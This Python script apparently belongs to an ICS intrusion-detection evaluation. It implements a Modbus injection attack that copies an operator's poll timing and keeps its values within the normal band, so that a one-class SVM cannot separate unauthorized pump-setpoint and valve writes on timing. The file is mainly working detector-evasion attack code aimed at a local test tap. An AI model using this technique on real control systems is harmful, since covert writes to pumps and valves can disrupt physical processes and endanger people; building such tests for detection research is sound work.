"""
Timing-mimicking injection - a harder injection for limitation 1.

The generalization check showed the one-class SVM separated the earlier
attacks largely on timing: operator writes follow a level poll within a few
milliseconds, while the earlier injection's commands arrived 0.3-2 s apart on
their own connection. This variant removes that gap. It reproduces the
operator's routine on its own connection - a roughly 1 s level-poll loop with
the same jitter - and places each unauthorized write 1-5 ms after one of its
own polls, so the injected write sits inside the normal inter-arrival
distribution. To keep the writes from standing out on content as well, their
values stay inside the operator's normal operating band (setpoint 20-90%,
valves ON/OFF); only the fact that they are unauthorized makes them attacks.

This is the case the content-only countermeasures are meant for: value-change
features (a value repeated or stepped unusually) and sender identity (the
write comes from a host that never wrote during training). Timing alone no
longer separates it.

Cover polls are logged with kind "cover" (the labeler leaves them unscored:
they change nothing in the process, so they are neither hits nor false
alarms). The unauthorized writes are logged with kind "attack". The script
also reports its source port and drawn parameters, as the other attack
scripts do.

Usage (normally invoked by a scenario orchestrator):
    python attacks/mimic_injection.py [--seed N] [--src-ip 127.0.0.66]
"""

import json
import random
import socket
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from modbus_frames import (log_packet, read_holding,  # noqa: E402
                           write_single_coil, write_single_register)

TAP_HOST = "127.0.0.1"
TAP_PORT = 5021

HR_LEVEL = 0
HR_PUMP_SETPOINT = 1
COIL_INLET_VALVE = 0
COIL_OUTLET_VALVE = 1

POLL_INTERVAL = 1.0
POLL_JITTER = 0.25
WRITE_AFTER_POLL = (0.001, 0.005)   # seconds: inside the operator's gap


def plan(seed: int | None = None) -> dict:
    """The in-band writes to inject and how many cover polls to send. Fixed
    unless seeded."""
    if seed is None:
        writes = [{"fc": 6, "address": HR_PUMP_SETPOINT, "value": 80},
                  {"fc": 5, "address": COIL_INLET_VALVE, "value": 1},
                  {"fc": 6, "address": HR_PUMP_SETPOINT, "value": 30}]
        return {"polls": 10, "writes": writes}
    rng = random.Random(seed)
    n = rng.randint(2, 5)
    writes = []
    for _ in range(n):
        if rng.random() < 0.6:
            writes.append({"fc": 6, "address": HR_PUMP_SETPOINT,
                           "value": rng.randrange(20, 95, 5)})
        else:
            writes.append({"fc": 5, "address": rng.choice([COIL_INLET_VALVE, COIL_OUTLET_VALVE]),
                           "value": rng.choice([0, 1])})
    return {"polls": rng.randint(8, 16), "writes": writes}


def frame_for(cmd: dict, txid: int) -> bytes:
    if cmd["fc"] == 5:
        return write_single_coil(txid, cmd["address"], on=bool(cmd["value"]))
    return write_single_register(txid, cmd["address"], cmd["value"])


def parse_arg(argv, name):
    return argv[argv.index(name) + 1] if name in argv else None


def connect(src_ip: str | None) -> socket.socket:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if src_ip:
        sock.bind((src_ip, 0))
    sock.connect((TAP_HOST, TAP_PORT))
    return sock


def send(sock, frame, kind, describe):
    log_packet(frame, kind, describe)
    sock.sendall(frame)
    try:
        sock.recv(256)
    except OSError:
        pass


def main() -> None:
    seed = parse_arg(sys.argv, "--seed")
    src_ip = parse_arg(sys.argv, "--src-ip")
    rng = random.Random(int(seed) if seed is not None else 0)
    p = plan(int(seed) if seed is not None else None)
    print("PARAMS=" + json.dumps(p), flush=True)

    sock = connect(src_ip)
    print(f"SOURCE_PORT={sock.getsockname()[1]}", flush=True)

    # Spread the writes across the poll loop so each follows a poll.
    writes = list(p["writes"])
    due = sorted(rng.sample(range(p["polls"]), min(len(writes), p["polls"])))
    txid = 1
    for i in range(p["polls"]):
        send(sock, read_holding(txid, HR_LEVEL, 1), "cover", f"cover poll {i + 1}")
        txid += 1
        if due and i == due[0]:
            due.pop(0)
            cmd = writes.pop(0)
            time.sleep(rng.uniform(*WRITE_AFTER_POLL))
            send(sock, frame_for(cmd, txid), "attack",
                 f"in-band write FC{cmd['fc']} addr {cmd['address']} -> {cmd['value']}")
            txid += 1
        time.sleep(max(0.1, POLL_INTERVAL + rng.uniform(-POLL_JITTER, POLL_JITTER)))

    sock.close()
    print("[mimic] done.")


if __name__ == "__main__":
    main()
